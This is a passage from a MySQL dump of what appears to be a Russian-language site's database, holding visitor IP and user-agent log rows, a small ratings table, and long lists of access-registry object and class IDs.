  (11760,'80.251.112.43','',0,84,1231546217),
  (11761,'80.251.112.43','',0,130,1231546233),
  (11762,'72.30.78.224','',0,253,1231546330),
  (11763,'64.1.215.165','',0,299,1231546746),
  (11764,'72.30.78.224','',0,263,1231546758),
  (11765,'65.55.105.203','',0,320,1231546901),
  (11766,'64.1.215.165','',0,308,1231547601),
  (11767,'65.55.105.208','',0,332,1231548138),
  (11768,'65.55.109.220','',0,332,1231548753),
  (11769,'66.249.66.47','',0,339,1231548812),
  (11770,'77.88.30.246','',0,347,1231549949),
  (11771,'77.88.30.246','',0,345,1231549959),
  (11772,'77.88.30.246','',0,343,1231549969),
  (11773,'77.88.30.246','',0,346,1231550023),
  (11774,'78.24.225.72','',0,1,1231550172),
  (11775,'65.55.105.197','',0,326,1231551632),
  (11776,'92.112.137.121','',0,352,1231551655),
  (11777,'64.1.215.165','',0,310,1231551834),
  (11778,'92.112.137.121','',0,247,1231552190),
  (11779,'92.112.137.121','',0,235,1231552202),
  (11780,'92.112.137.121','',0,227,1231552221),
  (11781,'92.112.137.121','',0,212,1231552414),
  (11782,'89.239.131.43','',0,347,1231552740),
  (11783,'64.1.215.165','',0,143,1231552745),
  (11784,'89.239.131.43','',0,349,1231552747),
  (11785,'72.30.78.224','',0,349,1231553076),
  (11786,'89.239.131.43','',0,311,1231553320),
  (11787,'89.239.131.43','',0,296,1231553566),
  (11788,'89.239.131.43','',0,292,1231553647),
  (11789,'217.197.1.223','',0,339,1231553829),
  (11790,'89.218.28.23','',0,133,1231554354),
  (11791,'72.30.78.224','',0,353,1231554774),
  (11792,'66.231.188.53','',0,298,1231555282),
  (11793,'72.30.78.224','',0,320,1231555502),
  (11794,'93.81.254.175','',0,60,1231555527),
  (11795,'89.218.28.23','',0,139,1231555788),
  (11796,'89.218.28.23','',0,70,1231555798),
  (11797,'64.1.215.165','',0,308,1231556702),
  (11798,'72.30.78.224','',0,346,1231558378),
  (11799,'65.55.105.205','',0,327,1231558401),
  (11800,'65.55.105.205','',0,325,1231558403),
  (11801,'65.55.105.197','',0,324,1231558432),
  (11802,'65.55.105.206','',0,333,1231559114),
  (11803,'72.30.78.224','',0,80,1231559588),
  (11804,'65.55.109.51','',0,327,1231560378),
  (11805,'65.55.109.170','',0,325,1231560428),
  (11806,'64.1.215.165','',0,195,1231561694),
  (11807,'65.55.105.205','',0,331,1231561928),
  (11808,'91.194.191.245','',0,12,1231562316),
  (11809,'64.1.215.165','',0,12,1231562679),
  (11810,'72.30.78.224','',0,216,1231562709),
  (11811,'88.204.144.99','',0,1,1231563242),
  (11812,'88.204.144.99','',0,55,1231563244),
  (11813,'88.204.144.99','',0,258,1231563258),
  (11814,'65.55.105.204','',0,328,1231564832),
  (11815,'91.202.197.79','',0,353,1231565042),
  (11816,'65.55.110.29','',0,328,1231565302),
  (11817,'64.1.215.165','',0,332,1231565325),
  (11818,'91.202.197.79','',0,349,1231565439),
  (11819,'66.249.66.47','',0,70,1231566775),
  (11820,'65.55.105.194','',0,325,1231566830),
  (11821,'65.55.107.206','',0,325,1231567050),
  (11822,'64.1.215.165','',0,339,1231568445),
  (11823,'72.30.78.224','',0,325,1231571178),
  (11824,'72.30.78.224','',0,324,1231571555),
  (11825,'78.24.224.214','',0,1,1231571776),
  (11826,'66.249.66.47','',0,3,1231572360),
  (11827,'83.149.40.45','',0,349,1231572589),
  (11828,'64.1.215.165','',0,139,1231572850),
  (11829,'72.30.78.224','',0,320,1231573011),
  (11830,'95.24.34.3','',0,346,1231573016),
  (11831,'72.30.78.224','',0,183,1231573062),
  (11832,'193.232.92.242','',0,353,1231573544),
  (11833,'193.232.92.242','',0,352,1231573722),
  (11834,'72.30.78.224','',0,264,1231574004),
  (11835,'72.30.78.224','',0,2,1231574642),
  (11836,'62.140.253.6','',0,351,1231574821),
  (11837,'64.1.215.165','',0,68,1231576146),
  (11838,'64.1.215.165','',0,69,1231576348),
  (11839,'72.30.78.224','',0,23,1231576375),
  (11840,'64.1.215.165','',0,279,1231576499),
  (11841,'94.178.143.182','',0,234,1231577342),
  (11842,'212.98.164.146','',0,250,1231577387),
  (11843,'91.122.30.252','',0,351,1231579400),
  (11844,'86.57.177.121','',0,299,1231579430),
  (11845,'65.55.105.194','',0,327,1231579725),
  (11846,'91.122.30.252','',0,353,1231579726),
  (11847,'91.122.30.252','',0,352,1231579729),
  (11848,'72.30.78.224','',0,322,1231580202),
  (11849,'217.21.63.10','',0,249,1231580305),
  (11850,'217.21.63.10','',0,220,1231580455),
  (11851,'217.21.63.10','',0,207,1231580498),
  (11852,'92.50.248.36','',0,353,1231580503),
  (11853,'92.50.248.36','',0,352,1231580513),
  (11854,'217.21.63.10','',0,205,1231580689),
  (11855,'217.21.63.10','',0,108,1231580758),
  (11856,'84.204.88.65','',0,353,1231580760),
  (11857,'84.204.88.65','',0,349,1231580868),
  (11858,'217.21.63.10','',0,76,1231580960),
  (11859,'84.204.88.65','',0,343,1231580967),
  (11860,'217.21.63.10','',0,48,1231581026),
  (11861,'217.21.63.10','',0,21,1231581087),
  (11862,'84.204.88.65','',0,339,1231581173),
  (11863,'72.30.78.224','',0,251,1231581230),
  (11864,'72.30.78.224','',0,141,1231581324),
  (11865,'66.249.66.47','',0,245,1231581618),
  (11866,'217.21.56.2','',0,258,1231581932),
  (11867,'66.249.66.47','',0,3,1231582659),
  (11868,'65.55.105.195','',0,328,1231582778),
  (11869,'92.50.248.36','',0,348,1231583022),
  (11870,'92.50.248.36','',0,347,1231583093),
  (11871,'92.50.248.36','',0,343,1231583198),
  (11872,'84.204.88.65','',0,247,1231583276),
  (11873,'84.204.88.65','',0,212,1231583386),
  (11874,'84.204.88.65','',0,119,1231583431),
  (11875,'72.30.78.224','',0,60,1231583781),
  (11876,'78.24.224.214','',0,1,1231584320),
  (11877,'80.234.71.79','',0,349,1231585205),
  (11878,'72.30.78.224','',0,324,1231585841),
  (11879,'92.242.10.87','',0,299,1231586442),
  (11880,'88.204.16.169','',0,353,1231586989),
  (11881,'93.80.82.169','',0,109,1231587004),
  (11882,'88.204.16.169','',0,352,1231587052),
  (11883,'93.80.82.169','',0,93,1231587083),
  (11884,'93.80.82.169','',0,238,1231587110),
  (11885,'93.80.82.169','',0,141,1231587123),
  (11886,'93.80.82.169','',0,107,1231587131),
  (11887,'72.30.78.224','',0,256,1231587160),
  (11888,'93.80.82.169','',0,347,1231587191),
  (11889,'93.80.82.169','',0,335,1231587203),
  (11890,'93.80.82.169','',0,326,1231587207),
  (11891,'93.80.82.169','',0,111,1231587308),
  (11892,'93.80.82.169','',0,258,1231587319),
  (11893,'93.80.82.169','',0,246,1231587345),
  (11894,'92.244.233.170','',0,347,1231587484),
  (11895,'78.37.114.35','',0,212,1231587489),
  (11896,'66.249.66.47','',0,350,1231592926),
  (11897,'92.112.22.209','',0,355,1231593177),
  (11898,'66.231.188.53','',0,348,1231593660),
  (11899,'81.25.46.86','',0,352,1231593676),
  (11900,'91.202.197.79','',0,355,1231594330),
  (11901,'78.85.24.112','',0,355,1231594565),
  (11902,'78.106.244.102','',0,246,1231594674),
  (11903,'72.30.78.224','',0,229,1231594729),
  (11904,'94.253.25.104','',0,354,1231595030),
  (11905,'88.200.246.248','',0,133,1231595247),
  (11906,'94.253.25.104','',0,350,1231595254),
  (11907,'93.125.10.114','',0,18,1231595591),
  (11908,'213.184.248.166','',0,141,1231595855),
  (11909,'213.184.248.166','',0,176,1231595919),
  (11910,'213.184.248.166','',0,8,1231596024),
  (11911,'127.0.0.1','',0,355,1233451176),
  (11912,'127.0.0.1','',0,355,1235385806),
  (11913,'127.0.0.1','',0,354,1235385982),
  (11914,'127.0.0.1','',0,353,1235386065),
  (11915,'127.0.0.1','',0,351,1235386209),
  (11916,'127.0.0.1','',0,1,1235386258),
  (11917,'127.0.0.1','',0,350,1235386909),
  (11918,'127.0.0.1','',0,355,1236863273),
  (11919,'127.0.0.1','',0,346,1236865919),
  (11920,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7',1,351,1236866064),
  (11921,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7',1,327,1237554618);
COMMIT;

#
# Structure for the `ratings_ratings` table : 
#

DROP TABLE IF EXISTS `ratings_ratings`;

CREATE TABLE `ratings_ratings` (
  `id` INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `folder_id` INTEGER(10) UNSIGNED NOT NULL,
  `user_id` INTEGER(10) UNSIGNED NOT NULL,
  `created` INTEGER(11) NOT NULL,
  `ip_address` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `useragent` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `ratevalue` INTEGER(11) NOT NULL,
  `parent_id` INTEGER(10) UNSIGNED NOT NULL,
  PRIMARY KEY (`id`),
  KEY `folder_id` (`folder_id`),
  KEY `user_id` (`user_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=5 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `ratings_ratings` table  (LIMIT 0,500)
#

INSERT INTO `ratings_ratings` (`id`, `folder_id`, `user_id`, `created`, `ip_address`, `useragent`, `ratevalue`, `parent_id`) VALUES 
  (1,1,2,0,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',1,355),
  (2,1,2,0,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',1,355),
  (3,1,2,1242124606,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',1,355),
  (4,1,2,1242125787,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',-1,354);
COMMIT;

#
# Structure for the `ratings_ratingsFolder` table : 
#

DROP TABLE IF EXISTS `ratings_ratingsFolder`;

CREATE TABLE `ratings_ratingsFolder` (
  `id` INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(10) UNSIGNED NOT NULL,
  `alias` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `module` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `type` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `by_field` CHAR(25) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=2 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `ratings_ratingsFolder` table  (LIMIT 0,500)
#

INSERT INTO `ratings_ratingsFolder` (`id`, `obj_id`, `alias`, `module`, `type`, `by_field`) VALUES 
  (1,2880,'govnokod','quoter','quote','id');
COMMIT;

#
# Structure for the `sys_access` table : 
#

DROP TABLE IF EXISTS `sys_access`;

CREATE TABLE `sys_access` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `action_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `class_id` INTEGER(11) DEFAULT NULL,
  `obj_id` INTEGER(11) DEFAULT NULL,
  `uid` INTEGER(11) DEFAULT NULL,
  `gid` INTEGER(11) DEFAULT NULL,
  `allow` TINYINT(1) UNSIGNED DEFAULT '0',
  `deny` TINYINT(1) UNSIGNED DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `class_action_id` (`class_id`, `obj_id`, `uid`, `gid`),
  KEY `obj_id_gid` (`obj_id`, `gid`),
  KEY `obj_id_uid` (`obj_id`, `uid`)
)ENGINE=MyISAM
AUTO_INCREMENT=1 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Structure for the `sys_access_registry` table : 
#

DROP TABLE IF EXISTS `sys_access_registry`;

CREATE TABLE `sys_access_registry` (
  `obj_id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `class_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`obj_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=2613 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_access_registry` table  (LIMIT 0,500)
#

INSERT INTO `sys_access_registry` (`obj_id`, `class_id`) VALUES 
  (1,9),
  (2,7),
  (3,7),
  (4,7),
  (5,7),
  (6,7),
  (7,7),
  (8,7),
  (9,7),
  (10,13),
  (11,6),
  (13,6),
  (14,4),
  (15,4),
  (16,4),
  (17,3),
  (18,3),
  (19,8),
  (20,8),
  (21,8),
  (22,55),
  (23,55),
  (24,15),
  (27,49),
  (28,51),
  (30,13),
  (31,6),
  (34,55),
  (35,55),
  (36,55),
  (38,54),
  (40,54),
  (41,54),
  (42,54),
  (43,54),
  (44,54),
  (46,54),
  (47,54),
  (48,54),
  (49,54),
  (50,54),
  (51,6),
  (52,54),
  (53,54),
  (54,54),
  (55,54),
  (56,54),
  (732,54),
  (733,54),
  (734,54),
  (735,54),
  (736,54),
  (737,56),
  (738,55),
  (739,55),
  (740,55),
  (741,55),
  (742,54),
  (743,54),
  (744,54),
  (745,54),
  (746,54),
  (747,54),
  (748,54),
  (749,55),
  (750,54),
  (751,54),
  (752,54),
  (760,54),
  (761,11),
  (762,54),
  (765,54),
  (766,54),
  (767,55),
  (768,54),
  (770,54),
  (771,54),
  (772,54),
  (773,54),
  (774,54),
  (775,11),
  (776,11),
  (777,10),
  (778,10),
  (779,3),
  (780,8),
  (782,3),
  (783,8),
  (785,11),
  (786,10),
  (787,11),
  (788,11),
  (789,11),
  (790,11),
  (791,11),
  (792,10),
  (793,11),
  (794,11),
  (795,10),
  (796,11),
  (797,11),
  (798,10),
  (799,11),
  (800,10),
  (801,10),
  (802,11),
  (803,10),
  (804,11),
  (805,11),
  (806,11),
  (807,11),
  (808,11),
  (809,11),
  (810,11),
  (811,11),
  (812,11),
  (813,11),
  (814,10),
  (815,11),
  (816,11),
  (817,11),
  (818,10),
  (819,10),
  (820,10),
  (821,11),
  (822,11),
  (823,11),
  (824,4),
  (825,8),
  (826,8),
  (827,11),
  (828,10),
  (829,10),
  (830,11),
  (831,10),
  (832,11),
  (833,11),
  (834,11),
  (835,11),
  (836,10),
  (837,10),
  (838,10),
  (839,10),
  (840,11),
  (841,10),
  (842,10),
  (843,10),
  (844,10),
  (845,10),
  (846,11),
  (847,10),
  (848,10),
  (849,10),
  (850,10),
  (851,10),
  (852,10),
  (853,11),
  (854,10),
  (855,10),
  (856,10),
  (857,10),
  (858,10),
  (859,10),
  (860,10),
  (861,10),
  (862,10),
  (863,10),
  (864,10),
  (865,10),
  (866,10),
  (867,10),
  (868,10),
  (870,11),
  (871,10),
  (872,10),
  (873,10),
  (874,10),
  (875,10),
  (876,10),
  (878,11),
  (879,10),
  (880,10),
  (881,10),
  (882,54),
  (883,11),
  (884,54),
  (885,11),
  (886,10),
  (887,54),
  (888,11),
  (889,54),
  (890,11),
  (891,10),
  (892,10),
  (893,54),
  (894,11),
  (895,10),
  (896,54),
  (897,11),
  (898,10),
  (899,10),
  (901,11),
  (902,54),
  (903,11),
  (905,10),
  (906,10),
  (907,10),
  (908,10),
  (909,10),
  (910,10),
  (911,10),
  (912,10),
  (913,10),
  (915,10),
  (916,54),
  (917,11),
  (918,10),
  (919,10),
  (920,54),
  (921,11),
  (922,10),
  (923,10),
  (924,10),
  (925,10),
  (926,10),
  (927,10),
  (928,10),
  (929,10),
  (930,10),
  (931,10),
  (932,10),
  (933,10),
  (934,10),
  (935,10),
  (936,10),
  (937,10),
  (939,54),
  (940,11),
  (941,10),
  (942,10),
  (944,11),
  (945,10),
  (946,10),
  (947,10),
  (948,10),
  (949,10),
  (950,10),
  (951,10),
  (952,10),
  (953,10),
  (954,10),
  (955,10),
  (956,54),
  (957,11),
  (958,10),
  (959,54),
  (960,11),
  (961,10),
  (962,10),
  (963,10),
  (964,10),
  (965,54),
  (966,11),
  (967,10),
  (968,10),
  (969,10),
  (970,10),
  (971,10),
  (972,10),
  (973,10),
  (974,3),
  (975,8),
  (976,8),
  (977,10),
  (978,54),
  (979,11),
  (980,54),
  (981,11),
  (982,10),
  (983,54),
  (984,11),
  (985,54),
  (986,11),
  (987,10),
  (988,10),
  (989,54),
  (990,11),
  (991,10),
  (992,10),
  (993,54),
  (994,11),
  (995,10),
  (996,10),
  (997,10),
  (998,54),
  (999,11),
  (1000,10),
  (1001,54),
  (1002,11),
  (1003,54),
  (1004,11),
  (1005,54),
  (1006,11),
  (1007,54),
  (1008,11),
  (1009,10),
  (1010,10),
  (1011,54),
  (1012,11),
  (1013,10),
  (1015,10),
  (1016,54),
  (1017,11),
  (1018,10),
  (1019,10),
  (1020,10),
  (1021,10),
  (1022,10),
  (1023,54),
  (1024,11),
  (1025,10),
  (1026,10),
  (1027,10),
  (1028,10),
  (1029,55),
  (1030,10),
  (1031,10),
  (1033,11),
  (1034,54),
  (1035,11),
  (1036,10),
  (1037,10),
  (1038,10),
  (1039,10),
  (1040,10),
  (1041,54),
  (1042,11),
  (1043,10),
  (1044,10),
  (1045,10),
  (1046,54),
  (1047,11),
  (1048,10),
  (1049,54),
  (1050,11),
  (1051,10),
  (1052,55),
  (1053,10),
  (1054,10),
  (1055,10),
  (1056,10),
  (1057,54),
  (1058,11),
  (1059,54),
  (1060,11),
  (1061,10),
  (1062,10),
  (1063,10),
  (1064,54),
  (1065,11),
  (1066,54),
  (1067,11),
  (1068,10),
  (1069,54),
  (1070,11),
  (1071,54),
  (1072,11),
  (1073,54),
  (1074,11),
  (1075,54),
  (1076,11),
  (1077,10),
  (1078,10),
  (1079,54),
  (1080,11),
  (1081,10),
  (1082,10),
  (1083,10),
  (1084,54),
  (1085,11),
  (1086,54),
  (1087,11),
  (1088,54),
  (1089,11),
  (1090,10),
  (1091,54),
  (1092,11),
  (1093,54),
  (1094,11),
  (1095,10),
  (1096,10),
  (1097,10),
  (1098,10),
  (1099,10),
  (1100,10),
  (1101,54),
  (1102,11),
  (1103,10),
  (1104,10),
  (1105,10),
  (1106,10),
  (1107,10),
  (1108,10),
  (1109,10),
  (1110,54),
  (1111,11),
  (1112,10),
  (1113,54),
  (1114,11),
  (1115,10),
  (1116,10),
  (1117,10),
  (1118,10),
  (1119,10),
  (1120,10),
  (1121,54),
  (1122,11),
  (1123,10),
  (1124,10),
  (1125,54),
  (1126,11),
  (1127,54),
  (1128,11),
  (1129,54),
  (1130,11),
  (1131,54),
  (1132,11),
  (1133,10),
  (1134,10),
  (1135,10),
  (1136,10),
  (1137,10),
  (1138,10),
  (1139,10),
  (1140,10),
  (1141,54),
  (1142,11),
  (1143,10),
  (1144,10),
  (1145,54),
  (1146,11),
  (1147,10),
  (1148,10),
  (1149,10),
  (1150,10),
  (1151,10),
  (1152,10),
  (1153,10),
  (1154,54),
  (1155,11),
  (1156,10),
  (1158,11),
  (1159,10),
  (1160,54),
  (1161,11),
  (1162,10),
  (1163,54),
  (1164,11),
  (1165,54),
  (1166,11),
  (1167,10),
  (1168,10),
  (1170,11),
  (1171,10),
  (1172,10),
  (1173,10),
  (1174,10),
  (1175,10),
  (1176,54),
  (1177,11),
  (1178,54),
  (1179,11),
  (1180,10),
  (1181,10),
  (1182,10),
  (1184,10),
  (1185,54),
  (1186,11),
  (1187,10),
  (1188,54),
  (1189,11),
  (1190,10),
  (1191,10),
  (1192,10),
  (1193,10),
  (1194,54),
  (1195,11),
  (1196,54),
  (1197,11),
  (1198,10),
  (1199,10),
  (1200,10),
  (1201,10),
  (1202,10),
  (1204,54),
  (1205,11),
  (1206,11),
  (1207,10),
  (1208,10),
  (1209,54);
COMMIT;

#
# Data for the `sys_access_registry` table  (LIMIT 500,500)
#

INSERT INTO `sys_access_registry` (`obj_id`, `class_id`) VALUES 
  (1210,11),
  (1211,10),
  (1212,10),
  (1213,10),
  (1214,54),
  (1215,11),
  (1216,10),
  (1217,54),
  (1218,11),
  (1219,10),
  (1220,54),
  (1221,11),
  (1222,10),
  (1223,54),
  (1224,11),
  (1227,54),
  (1228,11),
  (1229,54),
  (1230,11),
  (1232,11),
  (1233,10),
  (1234,10),
  (1235,10),
  (1236,54),
  (1237,11),
  (1238,10),
  (1239,10),
  (1240,10),
  (1241,54),
  (1242,11),
  (1243,10),
  (1244,54),
  (1245,11),
  (1246,10),
  (1247,10),
  (1248,54),
  (1249,11),
  (1250,6),
  (1251,54),
  (1252,11),
  (1253,54),
  (1254,11),
  (1255,54),
  (1256,11),
  (1257,54),
  (1258,11),
  (1259,10),
  (1260,10),
  (1261,54),
  (1262,11),
  (1263,10),
  (1264,10),
  (1265,10),
  (1266,10),
  (1267,10),
  (1268,54),
  (1269,11),
  (1270,10),
  (1271,10),
  (1272,10),
  (1273,10),
  (1274,10),
  (1275,10),
  (1276,10),
  (1277,10),
  (1278,10),
  (1279,54),
  (1280,11),
  (1281,10),
  (1282,10),
  (1283,10),
  (1284,10),
  (1285,10),
  (1286,10),
  (1287,10),
  (1288,10),
  (1289,10),
  (1290,10),
  (1291,10),
  (1292,10),
  (1293,10),
  (1294,10),
  (1295,10),
  (1296,10),
  (1297,10),
  (1298,10),
  (1299,10),
  (1300,10),
  (1301,54),
  (1302,11),
  (1303,10),
  (1304,10),
  (1305,10),
  (1306,10),
  (1307,10),
  (1308,10),
  (1309,10),
  (1310,10),
  (1311,54),
  (1312,11),
  (1313,10),
  (1314,10),
  (1315,10),
  (1316,10),
  (1317,54),
  (1318,11),
  (1319,10),
  (1320,10),
  (1321,10),
  (1322,10),
  (1323,54),
  (1324,11),
  (1326,11),
  (1328,10),
  (1329,10),
  (1330,10),
  (1331,10),
  (1332,10),
  (1333,10),
  (1335,11),
  (1336,10),
  (1337,10),
  (1338,10),
  (1339,10),
  (1340,10),
  (1341,10),
  (1342,10),
  (1343,10),
  (1344,10),
  (1345,10),
  (1346,10),
  (1348,11),
  (1349,10),
  (1351,11),
  (1352,10),
  (1353,10),
  (1354,10),
  (1355,54),
  (1356,11),
  (1357,10),
  (1358,10),
  (1359,10),
  (1360,10),
  (1361,54),
  (1362,11),
  (1363,10),
  (1364,10),
  (1365,54),
  (1366,11),
  (1367,54),
  (1368,11),
  (1369,54),
  (1370,11),
  (1371,54),
  (1372,10),
  (1373,11),
  (1375,11),
  (1376,54),
  (1377,11),
  (1378,10),
  (1379,54),
  (1380,11),
  (1381,54),
  (1382,11),
  (1383,10),
  (1384,10),
  (1385,10),
  (1386,10),
  (1387,10),
  (1388,10),
  (1389,10),
  (1390,10),
  (1391,54),
  (1392,11),
  (1393,10),
  (1394,54),
  (1395,11),
  (1396,10),
  (1397,10),
  (1398,10),
  (1399,10),
  (1400,10),
  (1401,10),
  (1402,10),
  (1403,54),
  (1404,11),
  (1405,10),
  (1406,54),
  (1407,11),
  (1408,10),
  (1410,11),
  (1411,10),
  (1413,11),
  (1414,10),
  (1415,10),
  (1416,10),
  (1417,10),
  (1418,10),
  (1419,10),
  (1420,54),
  (1421,11),
  (1422,10),
  (1423,10),
  (1424,10),
  (1425,10),
  (1426,10),
  (1427,54),
  (1428,11),
  (1429,10),
  (1430,10),
  (1431,10),
  (1432,10),
  (1433,10),
  (1435,11),
  (1436,10),
  (1437,10),
  (1438,10),
  (1439,10),
  (1440,10),
  (1442,10),
  (1443,54),
  (1444,11),
  (1445,54),
  (1446,11),
  (1447,54),
  (1448,11),
  (1449,10),
  (1450,10),
  (1452,11),
  (1453,10),
  (1454,10),
  (1455,10),
  (1456,10),
  (1457,10),
  (1458,10),
  (1459,54),
  (1460,11),
  (1461,10),
  (1462,10),
  (1464,10),
  (1465,10),
  (1466,10),
  (1467,10),
  (1468,10),
  (1469,10),
  (1470,54),
  (1471,11),
  (1472,54),
  (1473,11),
  (1474,10),
  (1475,10),
  (1476,10),
  (1477,10),
  (1478,10),
  (1479,10),
  (1480,54),
  (1481,11),
  (1482,54),
  (1483,11),
  (1484,10),
  (1485,54),
  (1486,11),
  (1487,10),
  (1488,10),
  (1489,54),
  (1490,11),
  (1491,54),
  (1492,11),
  (1493,54),
  (1494,11),
  (1495,10),
  (1496,54),
  (1497,11),
  (1498,10),
  (1499,54),
  (1500,11),
  (1501,54),
  (1502,11),
  (1503,10),
  (1504,54),
  (1505,11),
  (1506,10),
  (1507,54),
  (1508,11),
  (1509,10),
  (1510,10),
  (1511,10),
  (1512,10),
  (1513,10),
  (1514,10),
  (1515,10),
  (1516,10),
  (1517,54),
  (1518,11),
  (1519,10),
  (1520,10),
  (1521,10),
  (1522,54),
  (1523,11),
  (1524,54),
  (1525,11),
  (1526,10),
  (1527,54),
  (1528,11),
  (1529,10),
  (1530,10),
  (1531,54),
  (1532,11),
  (1533,54),
  (1534,11),
  (1535,10),
  (1536,54),
  (1537,11),
  (1538,54),
  (1539,11),
  (1540,10),
  (1541,54),
  (1542,11),
  (1543,10),
  (1544,10),
  (1545,10),
  (1548,54),
  (1549,11),
  (1550,10),
  (1551,10),
  (1552,10),
  (1553,10),
  (1554,54),
  (1555,11),
  (1556,10),
  (1557,54),
  (1558,11),
  (1559,10),
  (1560,10),
  (1561,10),
  (1562,10),
  (1563,10),
  (1564,10),
  (1565,54),
  (1566,11),
  (1567,10),
  (1568,54),
  (1569,11),
  (1570,10),
  (1571,54),
  (1572,11),
  (1573,10),
  (1574,54),
  (1575,11),
  (1576,10),
  (1577,10),
  (1578,54),
  (1579,11),
  (1580,10),
  (1581,54),
  (1582,11),
  (1583,54),
  (1584,11),
  (1585,10),
  (1586,10),
  (1587,54),
  (1588,11),
  (1590,11),
  (1591,10),
  (1592,10),
  (1593,10),
  (1594,10),
  (1595,10),
  (1596,10),
  (1598,11),
  (1599,10),
  (1600,10),
  (1601,10),
  (1603,11),
  (1604,10),
  (1605,10),
  (1606,54),
  (1607,11),
  (1608,10),
  (1609,10),
  (1610,10),
  (1611,10),
  (1612,10),
  (1613,10),
  (1614,10),
  (1615,10),
  (1616,10),
  (1617,10),
  (1618,10),
  (1619,10),
  (1620,10),
  (1621,54),
  (1622,11),
  (1623,10),
  (1624,10),
  (1625,10),
  (1626,10),
  (1627,10),
  (1628,54),
  (1629,11),
  (1630,11),
  (1631,10),
  (1632,54),
  (1633,11),
  (1634,10),
  (1635,10),
  (1636,10),
  (1637,10),
  (1638,10),
  (1639,10),
  (1640,10),
  (1641,10),
  (1642,10),
  (1643,54),
  (1644,10),
  (1645,11),
  (1646,10),
  (1647,10),
  (1648,10),
  (1649,10),
  (1650,10),
  (1651,10),
  (1652,54),
  (1653,11),
  (1654,10),
  (1655,10),
  (1656,10),
  (1657,10),
  (1658,10),
  (1659,10),
  (1660,10),
  (1661,10),
  (1662,10),
  (1663,10),
  (1664,54),
  (1665,11),
  (1666,54),
  (1667,11),
  (1668,10),
  (1669,10),
  (1670,54),
  (1671,11),
  (1672,10),
  (1673,10),
  (1674,10),
  (1675,10),
  (1676,10),
  (1677,54),
  (1678,11),
  (1679,10),
  (1680,54),
  (1681,11),
  (1682,10),
  (1683,10),
  (1684,10),
  (1685,10),
  (1686,10),
  (1687,10),
  (1688,54),
  (1689,11),
  (1690,10),
  (1691,10),
  (1692,10),
  (1693,10),
  (1694,10),
  (1695,10),
  (1696,10),
  (1697,10),
  (1698,10),
  (1699,54),
  (1700,11),
  (1701,10),
  (1702,10),
  (1703,10),
  (1704,10),
  (1705,10),
  (1706,10),
  (1707,10),
  (1708,10),
  (1709,10),
  (1710,10),
  (1711,54),
  (1712,11),
  (1713,54),
  (1714,11),
  (1715,10),
  (1716,10),
  (1717,54),
  (1718,11),
  (1719,10),
  (1720,10),
  (1721,54),
  (1722,11),
  (1723,10),
  (1724,10),
  (1725,10),
  (1726,10),
  (1727,10),
  (1728,10),
  (1729,54);
COMMIT;

#
# Data for the `sys_access_registry` table  (LIMIT 1000,500)
#

INSERT INTO `sys_access_registry` (`obj_id`, `class_id`) VALUES 
  (1730,11),
  (1731,10),
  (1732,54),
  (1733,11),
  (1734,54),
  (1735,11),
  (1736,10),
  (1737,54),
  (1738,11),
  (1739,54),
  (1740,11),
  (1741,54),
  (1742,11),
  (1743,54),
  (1744,11),
  (1745,54),
  (1746,11),
  (1747,10),
  (1748,10),
  (1749,54),
  (1750,11),
  (1751,54),
  (1752,11),
  (1753,10),
  (1754,10),
  (1755,10),
  (1756,10),
  (1757,10),
  (1759,11),
  (1760,10),
  (1761,10),
  (1762,10),
  (1763,10),
  (1764,10),
  (1765,10),
  (1766,10),
  (1767,10),
  (1768,10),
  (1769,10),
  (1770,10),
  (1771,10),
  (1772,54),
  (1773,11),
  (1774,10),
  (1775,54),
  (1776,11),
  (1777,54),
  (1778,11),
  (1779,54),
  (1780,11),
  (1781,54),
  (1782,11),
  (1783,54),
  (1784,11),
  (1785,54),
  (1786,11),
  (1787,10),
  (1788,10),
  (1789,10),
  (1790,10),
  (1791,54),
  (1792,11),
  (1793,10),
  (1794,54),
  (1795,11),
  (1796,10),
  (1797,54),
  (1798,11),
  (1799,10),
  (1800,54),
  (1801,11),
  (1802,10),
  (1803,10),
  (1804,10),
  (1805,10),
  (1806,10),
  (1807,10),
  (1808,10),
  (1809,54),
  (1810,11),
  (1811,10),
  (1812,10),
  (1813,10),
  (1814,10),
  (1815,10),
  (1816,10),
  (1817,54),
  (1818,11),
  (1819,10),
  (1820,10),
  (1821,10),
  (1822,10),
  (1823,10),
  (1824,10),
  (1825,10),
  (1826,10),
  (1827,10),
  (1828,10),
  (1829,10),
